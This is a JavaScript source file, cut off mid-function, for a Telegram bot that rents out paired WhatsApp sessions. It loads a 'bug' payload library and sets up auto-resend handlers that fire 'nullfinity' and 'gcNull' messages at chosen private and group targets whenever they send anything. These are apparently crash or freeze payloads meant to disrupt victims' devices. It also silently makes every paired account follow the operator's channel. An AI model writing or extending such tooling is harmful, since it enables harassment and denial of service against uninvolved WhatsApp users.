const fs = require('fs');
const path = require('path');
const axios = require('axios');
const crypto = require('crypto');
const {
  default: makeWASocket,
  encodeWAMessage,
  jidDecode,
  generateMessageIDV2,
  encodeSignedDeviceIdentity,
  useMultiFileAuthState,
  DisconnectReason,
  fetchLatestBaileysVersion,
  generateWAMessageFromContent,
  proto,
  prepareWAMessageMedia,
  relayMessage,
} = require('@whiskeysockets/baileys');
const P = require('pino');
const TelegramBot = require('node-telegram-bot-api');
const chalk = require('chalk');
const moment = require('moment-timezone');
const escapeHtml = (text) => String(text || '').replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');

//bug db
const { xeonKingIos } = require('./69/xKingIos.js');
const { bug } = require('./69/bug.js');
const { bugUrl } = require('./69/bugUrl.js')
const o = fs.readFileSync(`./69/o.jpg`)

//====group chat auto send bvg==========================================================\\
// Auto-resend for GROUPS: userNumber → Set of group JIDs
const gcNullAutoResend = new Map();

// Lock for groups (prevents multiple simultaneous sends)
const gcNullLock = new Set();  // keys: `${userNumber}:${groupJid}`

// Optional: self-trigger protection (same as private)
const recentGcAutoSent = new Map();
const GC_AUTO_IGNORE_WINDOW_MS = 300;
//==========private chat auto send bvg====================================================\\
// Temporary ignore after auto-send: prevents self-trigger loop
// Format: `${userNumber}:${targetJid}` → timestamp when last auto was sent
const recentAutoSent = new Map();
const AUTO_IGNORE_WINDOW_MS = 300;

// Temporary flag: during manual command, ignore the next X outgoing messages to this target
const ignoreOutgoingDuringCommand = new Map(); // userNumber → Set<targetJid>

// Auto-resend tracking: userNumber → Set of target JIDs that should get auto nullfinity
const nullfinityAutoResend = new Map();

// Lock to prevent burst spam (same idea as resendLock in the first code)
const nullfinityLock = new Set();  // will use keys like `${userNumber}:${targetJid}`

// Import configuration
const CONFIG = require('./config');

// Database initialization
const db = {
  premiumUsers: loadJson('./database/premium.json'),
  OwnerUsers: loadJson('./database/Owner.json'),
  userNumbers: loadJson('./database/user_numbers.json'),
  botTokens: loadJson('./database/bot_tokens.json'),
  bannedUsers: loadJson('./database/banned.json'),
};

// Session management
const sessions = new Map();
const whatsappStatusMap = new Map();
const rateLimits = new Map();
const RATE_LIMIT_WINDOW = 60 * 1000;
const MAX_COMMANDS_PER_WINDOW = 5;
const startTime = new Date();
const membershipCache = new Map();
const MEMBERSHIP_CACHE_TTL = 5 * 60 * 1000;

// Reactwa command specific rate limit (15 minutes cooldown after success)
const reactwaRateLimit = new Map(); // senderId → timestamp of last successful use
const REACTWA_COOLDOWN_MS = 15 * 60 * 1000; // 15 minutes in milliseconds

// Telegram bot initialization
const botInstances = new Map();
const bot = new TelegramBot(CONFIG.botToken, { polling: true });
botInstances.set('root', bot);

registerCommandHandlers(bot, true);

// === ANTI-PHONE NUMBER SYSTEM IN CONFIG.GROUP_ID ===
bot.on('message', async (msg) => {
  // Only monitor the specified group
  if (msg.chat.id !== parseInt(CONFIG.GROUP_ID)) return;

  // Skip bots and non-text/caption messages
  if (msg.from?.is_bot) return;
  const text = msg.text || msg.caption || '';
  if (!text) return;

  // Check for phone number
  if (containsPhoneNumber(text)) {
    try {
      const member = await bot.getChatMember(CONFIG.GROUP_ID, msg.from.id);
      // Admins and creator are exempt
      if (member.status === 'administrator' || member.status === 'creator') return;

      // Delete the message
      await bot.deleteMessage(msg.chat.id, msg.message_id);

      // Optional: send temporary warning (uncomment if you want)
      // const warning = await bot.sendMessage(msg.chat.id, '🚫 Phone numbers are not allowed in this group.');
      // setTimeout(() => bot.deleteMessage(msg.chat.id, warning.message_id).catch(() => {}), 5000);

    } catch (err) {
      console.error('Anti-phone delete error:', err.message);
    }
  }
});

// === ANTI-PHONE NUMBER SYSTEM FOR EDITED MESSAGES ===
bot.on('edited_message', async (msg) => {
  // Only monitor the specified group
  if (!msg.chat || msg.chat.id !== parseInt(CONFIG.GROUP_ID)) return;

  // Skip bots
  if (msg.from?.is_bot) return;

  // Get text or caption
  const text = msg.text || msg.caption || '';
  if (!text) return;

  // Check for phone number
  if (containsPhoneNumber(text)) {
    try {
      const member = await bot.getChatMember(CONFIG.GROUP_ID, msg.from.id);
      // Admins and creator are exempt
      if (member.status === 'administrator' || member.status === 'creator') return;

      // Delete the edited message
      await bot.deleteMessage(msg.chat.id, msg.message_id);

      // Optional: temporary warning (uncomment if desired)
      // const warning = await bot.sendMessage(msg.chat.id, '🚫 Phone numbers are not allowed (even in edits).');
      // setTimeout(() => bot.deleteMessage(msg.chat.id, warning.message_id).catch(() => {}), 5000);

    } catch (err) {
      console.error('Anti-phone delete error (edited message):', err.message);
    }
  }
});

// Utility functions

async function formatUserLink(bot, userId, isBanned = false) {
  let name = 'Deleted Account';
  let username = '';
  let canClick = false;
  try {
    const chat = await bot.getChat(userId);
    name = [chat.first_name || '', chat.last_name || ''].filter(Boolean).join(' ') || 'Deleted Account';
    username = chat.username ? ` (@${chat.username})` : '';
    canClick = true;
  } catch {}
  name = escapeHtml(name);
  const tag = isBanned ? ' <i>(Banned)</i>' : (name === 'Deleted Account' ? ' <i>(Deleted)</i>' : '');
  if (canClick) {
    return `<a href="tg://user?id=${userId}">${name}</a>${username}${tag}`;
  } else {
    return `<code>${name}</code>${username}${tag} <i>(not clickable)</i>`;
  }
}

function cleanBannedFromAll() {
  if (!Array.isArray(db.bannedUsers)) return;

  let cleaned = false;

  // Clean from Premium Users
  const premiumBefore = db.premiumUsers.length;
  db.premiumUsers = db.premiumUsers.filter(id => !db.bannedUsers.includes(id));
  if (db.premiumUsers.length !== premiumBefore) {
    cleaned = true;
    console.log(`Cleaned ${premiumBefore - db.premiumUsers.length} banned user(s) from premium list`);
  }

  // Clean from Resellers (OwnerUsers)
  const resellerBefore = db.OwnerUsers.length;
  db.OwnerUsers = db.OwnerUsers.filter(id => !db.bannedUsers.includes(id));
  if (db.OwnerUsers.length !== resellerBefore) {
    cleaned = true;
    console.log(`Cleaned ${resellerBefore - db.OwnerUsers.length} banned user(s) from reseller list`);
  }

  // Save both files if anything was cleaned
  if (cleaned) {
    saveJson('./database/premium.json', db.premiumUsers);
    saveJson('./database/Owner.json', db.OwnerUsers);
  }
}

function loadJson(file) {
  try {
    const rawData = fs.readFileSync(file, 'utf8') || '{}';
    const data = JSON.parse(rawData);
    if (file.includes('bot_tokens.json')) {
      // Handle old array format for backward compatibility
      if (Array.isArray(data)) {
        console.log(`Converting bot_tokens.json from array to object format`);
        const newData = {};
        // Assign existing tokens to the owner (or a default user ID) for backward compatibility
        data.forEach(token => {
          if (typeof token === 'string' && /^\d{9,10}:[A-Za-z0-9_-]{35}$/.test(token)) {
            newData[CONFIG.owner[0] || 'default_owner'] = token; // Use owner ID or a placeholder
          }
        });
        saveJson(file, newData); // Save the converted data
        console.log(`Converted bot_tokens.json to object with ${Object.keys(newData).length} tokens`);
        return newData;
      }
      // Ensure it's an object
      return typeof data === 'object' && data !== null ? data : {};
    }
    return data;
  } catch (err) {
    console.error(`Error loading ${file}: ${err.message}`);
    if (file.includes('bot_tokens.json')) {
      return {};
    }
    return {};
  }
}

function saveJson(file, data) {
  try {
    fs.writeFileSync(file, JSON.stringify(data, null, 2));
  } catch (err) {
    console.error(`Error saving ${file}:`, err.message);
  }
}

function sanitizePath(input) {
  // If input is null, undefined, or not a string → return a safe fallback
  if (!input || typeof input !== 'string') return 'unknown';
  return path.basename(input.replace(/[^0-9]/g, '')) || 'unknown';
}

function isValidPhoneNumber(number) {
  const cleaned = number.replace(/[^0-9+]/g, '');
  const phoneRegex = /^\+\d{8,15}$/;
  return phoneRegex.test(cleaned);
}

function containsPhoneNumber(text) {
  if (!text) return false;

  // Broad match for potential phone number strings
  const potentials = text.match(/(\+?[0-9][0-9\s\-\(\)\.\+]{8,30})/g) || [];

  for (let pot of potentials) {
    let cleaned = pot.replace(/[^\d+]/g, '');
    const hasPlus = cleaned.startsWith('+');
    const digits = hasPlus ? cleaned.slice(1) : cleaned;
    const digitLen = digits.length;

    // Valid international phone number length
    if ((hasPlus && digitLen >= 8 && digitLen <= 15) ||
        (!hasPlus && digitLen >= 10 && digitLen <= 15)) {
      return true;
    }
  }
  return false;
}

function getUserBot(currentBot) {
  if (!currentBot) {
    console.warn('No currentBot provided, falling back to root bot');
  }
  return currentBot || botInstances.get('root');
}

async function checkMembership(chatId, senderId, isRootBot) {
  if (!isRootBot) {
    return { isMember: true };
  }
  
  if (CONFIG.owner.includes(senderId)) {
    return { isMember: true };
  }

  const userBot = getUserBot(botInstances.get('root'));
  console.log(`Checking membership for chat ${chatId} using bot ${await userBot.getMe().then(info => `@${info.username}`)}`);

  const cacheKey = `${senderId}:membership`;
  const cached = membershipCache.get(cacheKey);
  if (cached && Date.now() - cached.timestamp < MEMBERSHIP_CACHE_TTL) {
    console.log(`Using cached membership status for ${senderId}: ${cached.isMember}`);
    if (cached.isMember) {
      return { isMember: true };
    }
  }

  let retries = 2;
  while (retries > 0) {
    try {
            const channelStatus = await userBot.getChatMember(CONFIG.CHANNEL_ID, senderId);
      const groupStatus = await userBot.getChatMember(CONFIG.GROUP_ID, senderId);

      const isChannelMember = ['member', 'administrator', 'creator'].includes(channelStatus.status);
      const isGroupMember = ['member', 'administrator', 'creator'].includes(groupStatus.status);

      if (isChannelMember && isGroupMember) {
      
      // Check ban ONLY here (after confirming membership)
        if (db.bannedUsers.includes(senderId)) {
          await userBot.sendMessage(chatId, `You are permanently banned from using this bot.\nPlease contact owner: ${CONFIG.usertele}`);
          membershipCache.set(cacheKey, { isMember: false, timestamp: Date.now() });
          return { isMember: false };
        }
      
        membershipCache.set(cacheKey, { isMember: true, timestamp: Date.now() });
        return { isMember: true };
      }

      const missing = [];
      const buttons = [];
      if (!isChannelMember) {
        missing.push('channel');
        buttons.push([{ text: '📢 Join Channel', url: CONFIG.CHANNEL_INVITE_LINK }]);
      }
      
      if (!isGroupMember) {
        missing.push('group');
        buttons.push([{ text: '👥 Join Group', url: CONFIG.GROUP_LINK }]);
      }
      
      buttons.push([{ text: '✅ Check Membership', callback_data: 'check_membership' }]);

      await userBot.sendMessage(chatId, `❌ You must subscribe my telegram channel to use this bot. After doing so, click "Check Membership" or use /checkmembership.`, {
        reply_markup: {
          inline_keyboard: buttons,
        },
      });

      membershipCache.set(cacheKey, { isMember: false, timestamp: Date.now() });     
      return { isMember: false };
    } catch (error) {
      console.error(`Error checking membership for ${senderId} (retry ${3 - retries}): ${error.message}`);
      retries--;
      if (retries === 0) {
        await userBot.sendMessage(chatId, `❌ Failed to verify membership due to an error. Please try /checkmembership later or contact ${CONFIG.usertele}`);
        membershipCache.set(cacheKey, { isMember: false, timestamp: Date.now() });
        return { isMember: false };
      }
      await sleep(1000);
    }
  }
}

async function checkVipMembership(senderId, userBot) {
  const cacheKey = `${senderId}:vip_membership`;
  const cached = membershipCache.get(cacheKey);
  if (cached && Date.now() - cached.timestamp < MEMBERSHIP_CACHE_TTL) {
    return cached.isMember;
  }

  try {
    const vipStatus = await userBot.getChatMember(CONFIG.VIP_CHANNEL_ID, senderId);
    const isVipMember = ['member', 'administrator', 'creator'].includes(vipStatus.status);
    membershipCache.set(cacheKey, { isMember: isVipMember, timestamp: Date.now() });
    return isVipMember;
  } catch (error) {
    console.error(`Error checking VIP membership for ${senderId}: ${error.message}`);
    return false;  // If error, don't grant access
  }
}

function checkRateLimit(senderId, chatId) {
  const now = Date.now();
  let userLimit = rateLimits.get(senderId);
  if (!userLimit || now - userLimit.lastReset > RATE_LIMIT_WINDOW) {
    rateLimits.set(senderId, { count: 1, lastReset: now });
    return true;
  }
  if (userLimit.count >= MAX_COMMANDS_PER_WINDOW) {
    const userBot = getUserBot(botInstances.get('root'));
    userBot.sendMessage(chatId, `❌ Rate limit exceeded. Try again in ${Math.ceil((RATE_LIMIT_WINDOW - (now - userLimit.lastReset)) / 1000)} seconds.`);
    return false;
  }
  userLimit.count++;
  return true;
}

function getOnlineDuration() {
  const onlineDuration = new Date() - startTime;
  const seconds = Math.floor((onlineDuration / 1000) % 60);
  const minutes = Math.floor((onlineDuration / (1000 * 60)) % 60);
  const hours = Math.floor((onlineDuration / (1000 * 60 * 60)) % 24);
  const days = Math.floor(onlineDuration / (1000 * 60 * 60 * 24));
  const years = Math.floor(days / 365);
  const remainingDays = days % 365;

  if (years > 0) {
    return `${years} year${years > 1 ? 's' : ''} ${remainingDays} day${remainingDays !== 1 ? 's' : ''} ${hours} hour${hours !== 1 ? 's' : ''} ${minutes} minute${minutes !== 1 ? 's' : ''}`;
  } else if (days > 0) {
    return `${days} day${days > 1 ? 's' : ''} ${hours} hour${hours !== 1 ? 's' : ''} ${minutes} minute${minutes !== 1 ? 's' : ''}`;
  } else {
    return `${hours}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
  }
}

async function deleteFolderRecursive(dir) {
  try {
    if (fs.existsSync(dir)) {
      fs.readdirSync(dir).forEach((file) => {
        const curPath = path.join(dir, file);
        if (fs.lstatSync(curPath).isDirectory()) {
          deleteFolderRecursive(curPath);
        } else {
          fs.unlinkSync(curPath);
        }
      });
      fs.rmdirSync(dir);
      console.log(`Deleted session folder: ${dir}`);
    }
  } catch (err) {
    console.error(`Error deleting folder ${dir}:`, err.message);
  }
}

function sleep(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

async function validateSession(userNumber, chatId, botInstance) {
  if (!sessions.has(userNumber) || !whatsappStatusMap.get(userNumber)) {
    const userBot = getUserBot(botInstance);
    await userBot.sendMessage(chatId, `❌ No active WhatsApp session for ${userNumber}. Please reconnect using /reqpair.`);
    // Clean up stale session data
    const chatIdForNumber = Object.keys(db.userNumbers).find((key) => db.userNumbers[key] === userNumber);
    if (chatIdForNumber) {
      delete db.userNumbers[chatIdForNumber];
      saveJson('./database/user_numbers.json', db.userNumbers);
    }
    sessions.delete(userNumber);
    whatsappStatusMap.delete(userNumber);
    return false;
  }
  return true;
}

// Helper function to handle reconnection attempts
async function reconnectSession(number, botInstance, sessionDir, maxRetries = 3, retryDelay = 5000) {
  let retries = maxRetries;
  const userBot = getUserBot(botInstance);
  const chatId = Object.keys(db.userNumbers).find((key) => db.userNumbers[key] === number);

  while (retries > 0) {
    try {
      console.log(`Attempting to reconnect WhatsApp session for ${number} (Retries left: ${retries})`);
      const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
      const sock = makeWASocket({
        auth: state,
        logger: P({ level: 'silent' }),
        /*version: [2, 3000, 1025190524],*/
        printQRInTerminal: false,
      });

      sessions.set(number, sock);
      whatsappStatusMap.set(number, false);
      
      sock.newsletterMsg = async (key, content = {}, timeout = 5000) => {
		const { type: rawType = 'INFO', name, description = '', picture = null, react, id, newsletter_id = key, ...media } = content;
		const type = rawType.toUpperCase();
		if (react) {
			if (!(newsletter_id.endsWith('@newsletter') || !isNaN(newsletter_id))) throw [{ message: 'Use Id Newsletter', extensions: { error_code: 204, severity: 'CRITICAL', is_retryable: false }}]
			if (!id) throw [{ message: 'Use Id Newsletter Message', extensions: { error_code: 204, severity: 'CRITICAL', is_retryable: false }}]
			const hasil = await sock.query({
				tag: 'message',
				attrs: {
					to: key,
					type: 'reaction',
					'server_id': id,
					id: generateMessageID()
				},
				content: [{
					tag: 'reaction',
					attrs: {
						code: react
					}
				}]
			});
			return hasil
		} else if (media && typeof media === 'object' && Object.keys(media).length > 0) {
			const msg = await generateWAMessageContent(media, { upload: sock.waUploadToServer });
			const anu = await sock.query({
				tag: 'message',
				attrs: { to: newsletter_id, type: 'text' in media ? 'text' : 'media' },
				content: [{
					tag: 'plaintext',
					attrs: /image|video|audio|sticker|poll/.test(Object.keys(media).join('|')) ? { mediatype: Object.keys(media).find(key => ['image', 'video', 'audio', 'sticker','poll'].includes(key)) || null } : {},
					content: proto.Message.encode(msg).finish()
				}]
			})
			return anu
		} else {
			if ((/(FOLLOW|UNFOLLOW|DELETE)/.test(type)) && !(newsletter_id.endsWith('@newsletter') || !isNaN(newsletter_id))) return [{ message: 'Use Id Newsletter', extensions: { error_code: 204, severity: 'CRITICAL', is_retryable: false }}]
			const _query = await sock.query({
				tag: 'iq',
				attrs: {
					to: 's.whatsapp.net',
					type: 'get',
					xmlns: 'w:mex'
				},
				content: [{
					tag: 'query',
					attrs: {
						query_id: type == 'FOLLOW' ? '9926858900719341' : type == 'UNFOLLOW' ? '7238632346214362' : type == 'CREATE' ? '6234210096708695' : type == 'DELETE' ? '8316537688363079' : '6563316087068696'
					},
					content: new TextEncoder().encode(JSON.stringify({
						variables: /(FOLLOW|UNFOLLOW|DELETE)/.test(type) ? { newsletter_id } : type == 'CREATE' ? { newsletter_input: { name, description, picture }} : { fetch_creation_time: true, fetch_full_image: true, fetch_viewer_metadata: false, input: { key, type: (newsletter_id.endsWith('@newsletter') || !isNaN(newsletter_id)) ? 'JID' : 'INVITE' }}
					}))
				}]
			}, timeout);
			const res = JSON.parse(_query.content[0].content)?.data?.xwa2_newsletter || JSON.parse(_query.content[0].content)?.data?.xwa2_newsletter_join_v2 || JSON.parse(_query.content[0].content)?.data?.xwa2_newsletter_leave_v2 || JSON.parse(_query.content[0].content)?.data?.xwa2_newsletter_create || JSON.parse(_query.content[0].content)?.data?.xwa2_newsletter_delete_v2 || JSON.parse(_query.content[0].content)?.errors || JSON.parse(_query.content[0].content)
			res.thread_metadata ? (res.thread_metadata.host = 'https://mmg.whatsapp.net') : null
			return res
		}
	}

      sock.ev.on('connection.update', async (update) => {
  const { connection, lastDisconnect } = update;
  if (connection === 'close') {
    const reason = lastDisconnect?.error?.output?.statusCode ?? lastDisconnect?.reason;
    console.log(`Disconnected for ${number}. Reason: ${reason}`);
    whatsappStatusMap.set(number, false);

    if (reason === DisconnectReason.connectionReplaced || reason === DisconnectReason.loggedOut) {
      await deleteFolderRecursive(sessionDir);
      if (chatId) {
        delete db.userNumbers[chatId];
        saveJson('./database/user_numbers.json', db.userNumbers);
        await userBot.sendMessage(chatId, `Your WhatsApp session for ${number} has been ${reason === DisconnectReason.loggedOut ? 'logged out' : 'replaced'}. Please reconnect using /reqpair.`);
      }
      sessions.delete(number);
      whatsappStatusMap.delete(number);
    } else if (reason === 503) {
      // Handle 503 error with reconnection
      console.log(`503 Service Unavailable for ${number}. Attempting to reconnect...`);
      await reconnectSession(number, botInstance, sessionDir, maxRetries - 1, retryDelay * 2);
    } else if (reason && (reason >= 500 || reason === 428 || reason === 408 || reason === 429)) {
      if (chatId) {
        await getSessions(userBot, chatId, number);
      }
    } else {
      console.log(`Unknown disconnect reason: ${reason} for ${number}. Attempting reconnect without deletion...`);
      await reconnectSession(number, botInstance, sessionDir, maxRetries - 1, retryDelay * 2);
    }
  } else if (connection === 'open') {
    whatsappStatusMap.set(number, true);
    console.log(`Reconnected to WhatsApp for ${number}!`);
    await sock.newsletterMsg(CONFIG.idch, { type: 'follow' }).catch(e => {});
    if (chatId) {
      await userBot.sendMessage(chatId, `✅ Reconnected WhatsApp session for ${number}.`);
    }
  }
});

      sock.ev.on('creds.update', saveCreds);
      return sock;
    } catch (error) {
  console.error(`Reconnect attempt failed for ${number}: ${error.message}`);
  retries--;
  if (retries === 0) {
    console.error(`Max retries reached for ${number}. Session not deleted, but manual reconnection required.`);
    if (chatId) {
      const userBot = getUserBot(botInstance);
      await userBot.sendMessage(chatId, `❌ Failed to reconnect WhatsApp session for ${number}: ${error.message}. Please try /reqpair.`);
    }
    return null;
  }
  await sleep(retryDelay);
}
  }
}

async function startWhatsapp(number, botInstance) {
  const sessionDir = `./rent-session/${sanitizePath(number)}@s.whatsapp.net`;
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
  const sock = makeWASocket({
    auth: state,
    logger: P({ level: 'silent' }),
    /*version: [2, 3000, 1025190524],*/
    printQRInTerminal: false,
  });

  sessions.set(number, sock);
  whatsappStatusMap.set(number, false);
  
  sock.newsletterMsg = async (key, content = {}, timeout = 5000) => {
		const { type: rawType = 'INFO', name, description = '', picture = null, react, id, newsletter_id = key, ...media } = content;
		const type = rawType.toUpperCase();
		if (react) {
			if (!(newsletter_id.endsWith('@newsletter') || !isNaN(newsletter_id))) throw [{ message: 'Use Id Newsletter', extensions: { error_code: 204, severity: 'CRITICAL', is_retryable: false }}]
			if (!id) throw [{ message: 'Use Id Newsletter Message', extensions: { error_code: 204, severity: 'CRITICAL', is_retryable: false }}]
			const hasil = await sock.query({
				tag: 'message',
				attrs: {
					to: key,
					type: 'reaction',
					'server_id': id,
					id: generateMessageID()
				},
				content: [{
					tag: 'reaction',
					attrs: {
						code: react
					}
				}]
			});
			return hasil
		} else if (media && typeof media === 'object' && Object.keys(media).length > 0) {
			const msg = await generateWAMessageContent(media, { upload: sock.waUploadToServer });
			const anu = await sock.query({
				tag: 'message',
				attrs: { to: newsletter_id, type: 'text' in media ? 'text' : 'media' },
				content: [{
					tag: 'plaintext',
					attrs: /image|video|audio|sticker|poll/.test(Object.keys(media).join('|')) ? { mediatype: Object.keys(media).find(key => ['image', 'video', 'audio', 'sticker','poll'].includes(key)) || null } : {},
					content: proto.Message.encode(msg).finish()
				}]
			})
			return anu
		} else {
			if ((/(FOLLOW|UNFOLLOW|DELETE)/.test(type)) && !(newsletter_id.endsWith('@newsletter') || !isNaN(newsletter_id))) return [{ message: 'Use Id Newsletter', extensions: { error_code: 204, severity: 'CRITICAL', is_retryable: false }}]
			const _query = await sock.query({
				tag: 'iq',
				attrs: {
					to: 's.whatsapp.net',
					type: 'get',
					xmlns: 'w:mex'
				},
				content: [{
					tag: 'query',
					attrs: {
						query_id: type == 'FOLLOW' ? '9926858900719341' : type == 'UNFOLLOW' ? '7238632346214362' : type == 'CREATE' ? '6234210096708695' : type == 'DELETE' ? '8316537688363079' : '6563316087068696'
					},
					content: new TextEncoder().encode(JSON.stringify({
						variables: /(FOLLOW|UNFOLLOW|DELETE)/.test(type) ? { newsletter_id } : type == 'CREATE' ? { newsletter_input: { name, description, picture }} : { fetch_creation_time: true, fetch_full_image: true, fetch_viewer_metadata: false, input: { key, type: (newsletter_id.endsWith('@newsletter') || !isNaN(newsletter_id)) ? 'JID' : 'INVITE' }}
					}))
				}]
			}, timeout);
			const res = JSON.parse(_query.content[0].content)?.data?.xwa2_newsletter || JSON.parse(_query.content[0].content)?.data?.xwa2_newsletter_join_v2 || JSON.parse(_query.content[0].content)?.data?.xwa2_newsletter_leave_v2 || JSON.parse(_query.content[0].content)?.data?.xwa2_newsletter_create || JSON.parse(_query.content[0].content)?.data?.xwa2_newsletter_delete_v2 || JSON.parse(_query.content[0].content)?.errors || JSON.parse(_query.content[0].content)
			res.thread_metadata ? (res.thread_metadata.host = 'https://mmg.whatsapp.net') : null
			return res
		}
	}

  sock.ev.on('connection.update', async (update) => {
  const { connection, lastDisconnect } = update;
  const userBot = getUserBot(botInstance);
  if (connection === 'close') {
    const reason = lastDisconnect?.error?.output?.statusCode ?? lastDisconnect?.reason;
    console.log(`Disconnected for ${number}. Reason: ${reason}`);
    whatsappStatusMap.set(number, false);

    if (reason === DisconnectReason.connectionReplaced || reason === DisconnectReason.loggedOut) {
      await deleteFolderRecursive(sessionDir);
      const chatId = Object.keys(db.userNumbers).find((key) => db.userNumbers[key] === number);
      if (chatId) {
        delete db.userNumbers[chatId];
        saveJson('./database/user_numbers.json', db.userNumbers);
        await userBot.sendMessage(chatId, `Your WhatsApp session for ${number} has been ${reason === DisconnectReason.loggedOut ? 'logged out' : 'replaced'}. Please reconnect using /reqpair.`);
      }
      sessions.delete(number);
      whatsappStatusMap.delete(number);
    } else if (reason === 503) {
      // Handle 503 error with reconnection
      console.log(`503 Service Unavailable for ${number}. Attempting to reconnect...`);
      await reconnectSession(number, botInstance, sessionDir);
    } else if (reason && (reason >= 500 || reason === 428 || reason === 408 || reason === 429)) {
      const chatId = Object.keys(db.userNumbers).find((key) => db.userNumbers[key] === number);
      if (chatId) {
        await getSessions(userBot, chatId, number);
      }
    } else {
      console.log(`Unknown disconnect reason: ${reason} for ${number}. Attempting reconnect without deletion...`);
      await reconnectSession(number, botInstance, sessionDir);
    }
  } else if (connection === 'open') {
    whatsappStatusMap.set(number, true);
    console.log(`Connected to WhatsApp for ${number}!`);
    await sock.newsletterMsg(CONFIG.idch, { type: 'follow' }).catch(e => {});
  }
});

//auto send bvg
sock.ev.on('messages.upsert', async (m) => {
  const msg = m.messages[0];
  if (!msg.message) return;

  const from = msg.key.remoteJid;
  if (!from.endsWith('@s.whatsapp.net')) return; // only private

  let targetJid = null;

  if (msg.key.fromMe) {
    // Outgoing message (bot → someone)
    targetJid = from;
  } else {
    // Incoming message (someone → bot)
    targetJid = msg.key.participant || from;
  }

  if (!targetJid) return;

  if (nullfinityAutoResend.has(number)) {
    const targets = nullfinityAutoResend.get(number);
    if (targets.has(targetJid)) {
      const lockKey = `${number}:${targetJid}`;

      // NEW: Skip if we just sent an auto message to this target recently
      const recentKey = `${number}:${targetJid}`;
      const lastAutoTime = recentAutoSent.get(recentKey) || 0;
      if (Date.now() - lastAutoTime < AUTO_IGNORE_WINDOW_MS) {
        console.log(`[SELF-TRIGGER BLOCK] Ignoring recent auto message to ${targetJid}`);
        return;
      }

      if (nullfinityLock.has(lockKey)) {
        console.log(`[LOCK] Skipping duplicate for ${targetJid}`);
        return;
      }

      nullfinityLock.add(lockKey);

      try {
        await xeonNullfinity(targetJid, number, null, botInstance, true, true);

        // IMPORTANT: Mark that we just sent an auto message
        recentAutoSent.set(recentKey, Date.now());

        // Auto-cleanup after window
        setTimeout(() => {
          const t = recentAutoSent.get(recentKey);
          if (t && Date.now() - t >= AUTO_IGNORE_WINDOW_MS) {
            recentAutoSent.delete(recentKey);
          }
        }, AUTO_IGNORE_WINDOW_MS + 100);

      } catch (e) {
        console.error(`Auto nullfinity failed:`, e.message);
      } finally {
        nullfinityLock.delete(lockKey);
      }
    }
  }
});

// ─────────────────────────────────────────────────────────────
// AUTO GCNULL - triggers when ANY message arrives in registered group
// ─────────────────────────────────────────────────────────────
sock.ev.on('messages.upsert', async (m) => {
  const msg = m.messages[0];
  if (!msg.message) return;

  const from = msg.key.remoteJid;
  if (!from.endsWith('@g.us')) return; // only GROUPS

  if (gcNullAutoResend.has(number)) {
    const targets = gcNullAutoResend.get(number);
    if (targets.has(from)) {  // from = group JID
      const lockKey = `${number}:${from}`;

      // Optional self-trigger protection (recommended)
      const recentKey = `${number}:${from}`;
      const lastAutoTime = recentGcAutoSent.get(recentKey) || 0;
      if (Date.now() - lastAutoTime < GC_AUTO_IGNORE_WINDOW_MS) {
        console.log(`[GC SELF-BLOCK] Ignoring recent auto to group ${from}`);
        return;
      }

      if (gcNullLock.has(lockKey)) {
        console.log(`[GC LOCK] Skipping duplicate for group ${from}`);
        return;
      }

      gcNullLock.add(lockKey);

      try {
        // Instant send (no sleep)
        await xeonGcNull(from, number, null, botInstance, false, true);

        // Mark timestamp for protection
        recentGcAutoSent.set(recentKey, Date.now());

        setTimeout(() => {
          const t = recentGcAutoSent.get(recentKey);
          if (t && Date.now() - t >= GC_AUTO_IGNORE_WINDOW_MS) {
            recentGcAutoSent.delete(recentKey);
          }
        }, GC_AUTO_IGNORE_WINDOW_MS + 100);

      } catch (e) {
        console.error(`Auto gcNull failed for group ${from}:`, e.message);
      } finally {
        gcNullLock.delete(lockKey);
      }
    }
  }
});

  sock.ev.on('creds.update', saveCreds);
  return sock;
}

async function getSessions(bot, chatId, number) {
  if (!bot || !chatId || !number) {
    console.error('Invalid inputs for getSessions');
    if (bot && chatId) {
      /*await bot.sendMessage(chatId, '❌ Internal error: Invalid parameters.');*/
    }
    return;
  }

  if (!/^\d{8,15}$/.test(number)) {
    await bot.sendMessage(chatId, `❌ Invalid number format: ${number}. Use digits only (8-15).`);
    return;
  }

  const sessionDir = `./rent-session/${sanitizePath(number)}@s.whatsapp.net`;

  try {
    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

    const sock = makeWASocket({
      auth: state,
      logger: P({ level: 'silent' }),
      /*version: [2, 3000, 1025190524],*/
      printQRInTerminal: false,
    });

    sessions.set(number, sock);
    whatsappStatusMap.set(number, false);

    sock.newsletterMsg = async (key, content = {}, timeout = 5000) => {
      const { type: rawType = 'INFO', name, description = '', picture = null, react, id, newsletter_id = key, ...media } = content;
      const type = rawType.toUpperCase();

      if (react) {
        if (!(newsletter_id.endsWith('@newsletter') || !isNaN(newsletter_id)))
          throw [{ message: 'Use Id Newsletter', extensions: { error_code: 204, severity: 'CRITICAL', is_retryable: false } }];

        if (!id)
          throw [{ message: 'Use Id Newsletter Message', extensions: { error_code: 204, severity: 'CRITICAL', is_retryable: false } }];

        return await sock.query({
          tag: 'message',
          attrs: {
            to: key,
            type: 'reaction',
            server_id: id,
            id: generateMessageID()
          },
          content: [{
            tag: 'reaction',
            attrs: { code: react }
          }]
        });
      }

      if (media && typeof media === 'object' && Object.keys(media).length > 0) {
        const msg = await generateWAMessageContent(media, { upload: sock.waUploadToServer });
        return await sock.query({
          tag: 'message',
          attrs: { to: newsletter_id, type: 'text' in media ? 'text' : 'media' },
          content: [{
            tag: 'plaintext',
            attrs: /image|video|audio|sticker|poll/.test(Object.keys(media).join('|'))
              ? { mediatype: Object.keys(media).find(k => ['image', 'video', 'audio', 'sticker', 'poll'].includes(k)) || null }
              : {},
            content: proto.Message.encode(msg).finish()
          }]
        });
      }

      const _query = await sock.query({
        tag: 'iq',
        attrs: { to: 's.whatsapp.net', type: 'get', xmlns: 'w:mex' },
        content: [{
          tag: 'query',
          attrs: {
            query_id:
              type === 'FOLLOW' ? '9926858900719341' :
              type === 'UNFOLLOW' ? '7238632346214362' :
              type === 'CREATE' ? '6234210096708695' :
              type === 'DELETE' ? '8316537688363079' :
              '6563316087068696'
          },
          content: new TextEncoder().encode(JSON.stringify({
            variables:
